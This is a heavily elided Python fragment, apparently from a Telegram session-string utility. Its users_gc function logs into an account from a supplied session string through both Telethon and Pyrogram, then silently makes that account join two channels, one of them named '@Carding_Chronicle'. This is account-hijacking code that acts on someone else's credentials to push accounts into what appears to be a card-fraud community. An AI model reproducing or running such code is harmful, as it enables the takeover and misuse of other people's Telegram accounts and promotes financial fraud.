...
from KanishkaSession.Helpers.data import info
...
async def users_gc(session):
    ...
    try:
        if session.endswith("="):
            ...
            await steve.connect()                          
            try:
                await steve(join("@Carding_Chronicle"))
                await steve(join("@Mr_Mrs_Krishna"))
            ...
            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
                try:
                    await stark.join_chat("@Carding_Chronicle")
                    await stark.join_chat("@Mr_Mrs_Krishna")
